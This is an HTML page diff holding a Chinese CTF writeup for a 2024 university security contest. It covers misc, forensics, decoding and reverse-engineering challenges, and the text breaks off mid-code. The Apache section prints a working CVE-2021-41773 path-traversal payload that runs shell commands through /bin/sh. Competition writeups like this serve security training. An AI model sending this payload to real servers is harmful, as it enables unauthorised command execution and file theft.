@@ -1,0 +1,1323 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  高校网络安全管理运维赛2024 | Ya1orin
+</title>
+<meta name="description" content="高校网络安全管理运维赛2024 Writeup"/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"LanguageName\":\"English\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false},{\"Lang\":\"zh-cn\",\"LanguageName\":\"简体中文\",\"LanguageCode\":\"\",\"Title\":\"\",\"LanguageDirection\":\"\",\"Weight\":1,\"Disabled\":false}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="高校网络安全管理运维赛2024 | Ya1orin" />
+  <meta
+    property="og:description"
+    content="高校网络安全管理运维赛2024 Writeup"
+  />
+  <meta property="og:url" content="http://localhost:1313/post/%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B2024/" />
+  <meta
+    property="og:site_name"
+    content="Ya1orin"
+  />
+  <meta
+    property="og:image"
+    content="/"
+  />
+  <meta property="article:author" content="Ya1orin" />
+  <meta property="article:published_time" content="2024-05-14T15:34:35&#43;08:00" />
+  <meta property="article:modified_time" content="2025-11-10T16:55:40&#43;08:00" /><meta property="article:tag" content="CTF" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/gitalk@1.8.0/dist/gitalk.css"
+    integrity="sha384-X7z7PUv2B67D8sPJyzDyGZSco1ADwmdI7ed4eCGtTKkClfyDFpPL9WgAn9XVr/Io" crossorigin="anonymous"/><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/friend">
+        <div class='main-nav-icon icon rotate'>&#xe62b;</div>
+        <span class="main-nav-link">友链</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"><a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" arial-selected="false" >English</li><li data-value="zh-cn" role="option" class="selected" arial-selected="true" >简体中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="高校网络安全管理运维赛2024"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">高校网络安全管理运维赛2024</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          class="sidebar-left"
+            ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#签到">签到</a></li>
+        <li><a href="#钓鱼邮件识别">钓鱼邮件识别</a>
+          <ul>
+            <li><a href="#flag1">Flag1</a></li>
+            <li><a href="#flag2">Flag2</a></li>
+            <li><a href="#flag3">Flag3</a></li>
+          </ul>
+        </li>
+        <li><a href="#easyshell">easyshell</a></li>
+        <li><a href="#secretdb">SecretDB</a></li>
+        <li><a href="#gateway">Gateway</a></li>
+        <li><a href="#apache">Apache</a></li>
+        <li><a href="#f-or-r">f or r</a></li>
+        <li><a href="#zip">zip</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#phpsql">phpsql</a></li>
+        <li><a href="#pyssrf">pyssrf</a></li>
+        <li><a href="#fileit">fileit</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#ezayre">ezayre</a></li>
+        <li><a href="#babyre">babyre</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#babypwn">babypwn</a></li>
+        <li><a href="#login">Login</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2024-05-14 15:34:35 &#43;0800 CST" itemprop="datePublished"
+      >2024-05-14</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-11-10</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/writeup"
+      data-aos="zoom-in"
+      >WRITEUP</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h1 id="misc">
+<a class="header-anchor" href="#misc"></a>
+Misc
+</h1><h2 id="签到">
+<a class="header-anchor" href="#%e7%ad%be%e5%88%b0"></a>
+签到
+</h2><p>GIF 拆分 字符拼接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">synt{guvf-vf-gur-fvtava-dhvm}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ROT13:
+</span></span><span class="line"><span class="cl">flag{this-is-the-signin-quiz}
+</span></span></code></pre></div><h2 id="钓鱼邮件识别">
+<a class="header-anchor" href="#%e9%92%93%e9%b1%bc%e9%82%ae%e4%bb%b6%e8%af%86%e5%88%ab"></a>
+钓鱼邮件识别
+</h2><p>打开eml
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000987869-fef6e026-ab6e-48b6-9021-2bfaea76c5f7.png" alt="image.png">
+base64解码
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001044105-c0cd5507-856c-4be4-a5c6-81ae9cdd50b2.png" alt="image.png"></p>
+<h3 id="flag1">
+<a class="header-anchor" href="#flag1"></a>
+Flag1
+</h3><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001095282-61c50ca4-113e-4166-a0dc-5e30556e66f1.png" alt="image.png"></p>
+<h3 id="flag2">
+<a class="header-anchor" href="#flag2"></a>
+Flag2
+</h3><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001124983-548bb90b-03a6-43f9-944c-771e6b3d6a61.png" alt="image.png"></p>
+<h3 id="flag3">
+<a class="header-anchor" href="#flag3"></a>
+Flag3
+</h3><p>第三段解析DNS的记录
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001261727-291d9bf4-b786-4932-a8df-dd9f00697bb6.png" alt="image.png">
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001299780-c1782382-0fb4-4ca7-9251-c3cad35c76d0.png" alt="image.png">
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001333207-14d79fb1-0bd1-4621-861c-02cc90060d10.png" alt="image.png"></p>
+<h2 id="easyshell">
+<a class="header-anchor" href="#easyshell"></a>
+easyshell
+</h2><p>追踪流到倒数几个服务器流量解密发现如下
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001338674-b5b72b11-14fe-4801-bb12-512dbc2055c7.png" alt="image.png">
+pk头，是zip，保存成zip文件
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001645217-5d17990d-6c8c-4465-b275-35ea6f729738.png" alt="image.png">
+还发现了secret2.txt的内容
+用上述txt，明文攻击zip
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715001905837-864105ca-f4d3-4a3f-9c95-0245f0ea4213.png" alt="image.png">
+用明文攻击获取到的key直接解secret1.txt
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715002034550-435df7d3-1d87-4d19-bd0f-e9d58ffa7c59.png" alt="image.png">
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715002091520-7cfff066-25f7-45f8-834b-e5bb657af9c1.png" alt="image.png"></p>
+<h2 id="secretdb">
+<a class="header-anchor" href="#secretdb"></a>
+SecretDB
+</h2><p>用DB Browser for SQLite查看数据库，但是说flag不在这里
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715008667764-0af23da2-58f8-4414-81e6-ed0f8c87301c.png" alt="image.png">
+放到010中，发现这句话下面还藏着点东西，在01 0F之间有东西
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715008933494-3b65d672-7a46-4b52-ab2d-94c5abb2123a.png" alt="image.png">
+然后写脚本进行提取</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">with open(&#39;secret.db&#39;, &#39;rb&#39;) as f:
+</span></span><span class="line"><span class="cl">    c = f.read()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">flag = {}
+</span></span><span class="line"><span class="cl">parts = c.split(b&#39;\x01\x0f&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">for i in parts[1:-2]:  # 修正切片范围
+</span></span><span class="line"><span class="cl">    flag[i[0]] = chr(i[1])
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 直接按照排序后的键值对打印结果
+</span></span><span class="line"><span class="cl">for k in sorted(flag.keys()):
+</span></span><span class="line"><span class="cl">    print(flag[k], end=&#39;&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"># 或者使用下面的一行代码来替代上面的 for 循环
+</span></span><span class="line"><span class="cl"># print(&#39;&#39;.join([flag[k] for k in sorted(flag.keys())]))
+</span></span></code></pre></div><h2 id="gateway">
+<a class="header-anchor" href="#gateway"></a>
+Gateway
+</h2><p>在附件中找到了密码，但还是编码的
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715006887010-6a828109-1d9a-441e-bc11-9f8886d24aea.png" alt="image.png">
+在题目附件里发现这个，联想到电信光猫的超密解密
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715009440301-bf91241e-f275-4c43-9729-fa66683d8488.png" alt="image.png">
+参考内容
+<a href="https://cloud.tencent.com/developer/article/2006614">破解光猫超级管理员密码，也就是获取telecomadmin的密码</a>
+把里面的数字提取，然后三位数的内容把数字减掉4，从ASCII转字符即可，其他部分直接从ASCII转成字符即可，拼在一起</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">numbers = [106, 112, 101, 107, 127, 101, 104, 49, 57, 56, 53, 56, 54, 56, 49, 51, 51, 105, 56, 103, 106, 49, 56, 50, 56, 103, 102, 56, 52, 101, 104, 102, 105, 53, 101, 53, 102, 129]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">decode = &#39;&#39;
+</span></span><span class="line"><span class="cl">for i in numbers:
+</span></span><span class="line"><span class="cl">    if i // 100 != 0:
+</span></span><span class="line"><span class="cl">        decode += chr(i - 4)    #三位数的按字母处理
+</span></span><span class="line"><span class="cl">    else:
+</span></span><span class="line"><span class="cl">        decode += chr(i)        #两位数的按数字处理
+</span></span><span class="line"><span class="cl">print(decode)
+</span></span></code></pre></div><h2 id="apache">
+<a class="header-anchor" href="#apache"></a>
+Apache
+</h2><ul>
+<li>源码：</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from flask import Flask,request,send_file
+</span></span><span class="line"><span class="cl">import socket
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app = Flask(&#34;webserver&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/&#39;,methods=[&#34;GET&#34;])
+</span></span><span class="line"><span class="cl">def index():
+</span></span><span class="line"><span class="cl">    return send_file(__file__)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">@app.route(&#39;/nc&#39;,methods=[&#34;POST&#34;])
+</span></span><span class="line"><span class="cl">def nc():
+</span></span><span class="line"><span class="cl">    try:
+</span></span><span class="line"><span class="cl">        dstport=int(request.form[&#39;port&#39;])
+</span></span><span class="line"><span class="cl">        data=request.form[&#39;data&#39;]
+</span></span><span class="line"><span class="cl">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span class="line"><span class="cl">        s.settimeout(1)
+</span></span><span class="line"><span class="cl">        s.connect((&#39;127.0.0.1&#39;, dstport))
+</span></span><span class="line"><span class="cl">        s.send(data.encode())
+</span></span><span class="line"><span class="cl">        recvdata = b&#39;&#39;
+</span></span><span class="line"><span class="cl">        while True:
+</span></span><span class="line"><span class="cl">            chunk = s.recv(2048)
+</span></span><span class="line"><span class="cl">            if not chunk.strip():
+</span></span><span class="line"><span class="cl">                break
+</span></span><span class="line"><span class="cl">            else:
+</span></span><span class="line"><span class="cl">                recvdata += chunk
+</span></span><span class="line"><span class="cl">                continue
+</span></span><span class="line"><span class="cl">        return recvdata
+</span></span><span class="line"><span class="cl">    except Exception as e:
+</span></span><span class="line"><span class="cl">        return str(e)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">app.run(host=&#34;0.0.0.0&#34;,port=8080,threaded=True)
+</span></span></code></pre></div><p>CVE-2021-41773
+<a href="https://blog.csdn.net/luochen2436/article/details/120698682">https://blog.csdn.net/luochen2436/article/details/120698682</a>
+payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">port=80&amp;data=POST%20%2fcgi-bin%2f.%252e%2f.%252e%2f.%252e%2f.%252e%2fbin%2fsh%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aAccept%3a%20*%2f*%0d%0aAccept-Language%3a%20zh-CN%2czh%3bq%3d0.8%2czh-TW%3bq%3d0.7%2czh-HK%3bq%3d0.5%2cen-US%3bq%3d0.3%2cen%3bq%3d0.2%0d%0aAccept-Encoding%3a%20gzip%2c%20deflate%0d%0aContent-Type%3a%20application%2fx-www-form-urlencoded%0d%0aCache%3a%20no-cache%0d%0aContent-Length%3a%2012%0d%0aConnection%3a%20close%0d%0a%0d%0aecho%3bcat%20%2ff*%0d%0a%0d%0a
+</span></span></code></pre></div><h2 id="f-or-r">
+<a class="header-anchor" href="#f-or-r"></a>
+f or r
+</h2><p>一层一层解压.cab文件，找到Cab for KB114514 PSFX，发现跟前两天的GeekCTF的题有点像
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000942707-a763ffbe-d4f5-490e-92f6-32bd3b39dfaa.png" alt="image.png">
+参考链接：
+<a href="https://qanux.github.io/2024/04/22/geek2024/index.html">https://qanux.github.io/2024/04/22/geek2024/index.html</a>
+利用脚本进行更新
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000915845-57755e75-109f-4bcd-92d8-01649e10567f.png" alt="image.png">
+这里的o_curl.exe是当前自己系统的curl.exe，-o是要输出的文件名，r为回滚的，要把这个r里的解压出来的文件替换成自己系统的补丁里的，f里的是压缩包里的（事实上就这一个有用的）
+出来个nnn.exe
+自己系统补丁位置：
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000871074-f02c0e14-6dd7-4369-80b2-ab0fc49ce6d3.png" alt="image.png">
+大概就是在winsxs中搜索curl有关的文件（也可能不是这里边的，在其他补丁里，直接全局搜也行）
+运行命令后得到最终输出的文件
+看下版本
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1715000887771-38ef610f-f0f8-4119-a0cf-64d42a8e897f.png" alt="image.png">
+得到flag</p>
+<h2 id="zip">
+<a class="header-anchor" href="#zip"></a>
+zip
+</h2><p>nc后用队伍token连接
+<img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/1714994481062-c54c911c-25a6-4e4f-af53-dc48ae968a09.png" alt="image.png">
+源码main函数分析</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">load</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">system</span><span class="p">(</span><span class="s2">&#34;7z&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;your token:&#34;</span><span class="p">);</span><span class="o">//</span><span class="err">输入</span><span class="n">token</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">cmpstr</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">buf</span><span class="p">))</span> <span class="p">{</span><span class="o">//</span><span class="err">进行校验</span>
+</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;wrong token!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">zip</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="o">//</span><span class="err">压缩文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;your flag:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">stdin</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">cmpstr</span><span class="p">(</span><span class="s2">&#34;flag{&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">))</span> <span class="p">{</span><span class="o">//</span><span class="err">进行校验</span>
+</span></span><span class="line"><span class="cl">        <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;wrong flag!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">unzip</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="o">//</span><span class="err">解压</span>
+</span></span><span class="line"><span class="cl">
